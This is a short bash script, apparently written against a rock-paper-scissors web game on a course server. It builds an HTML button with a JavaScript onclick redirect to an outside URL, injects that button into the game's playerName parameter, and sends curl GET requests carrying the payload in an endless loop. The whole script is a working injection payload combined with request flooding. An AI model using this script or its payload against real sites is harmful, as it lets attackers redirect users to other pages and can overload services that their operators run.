#!/bin/bash

# Encoded button tag with JavaScript
encoded_button_tag="<button onclick=\"window.location.href = 'https://stone.sifs0005.infs.ch/91912126-58d8-4382-a77e-05621539c7f1';\">Click Me</button>"

# Replace this URL with your target URL
URL="https://stone.sifs0005.infs.ch/play?playerName=$encoded_button_tag&playerHand=Rock&mode=spock"

i=1
while true; do
    echo "Sending GET request $i to $URL"
    curl -s "$URL" > /dev/null
    ((i++))
done
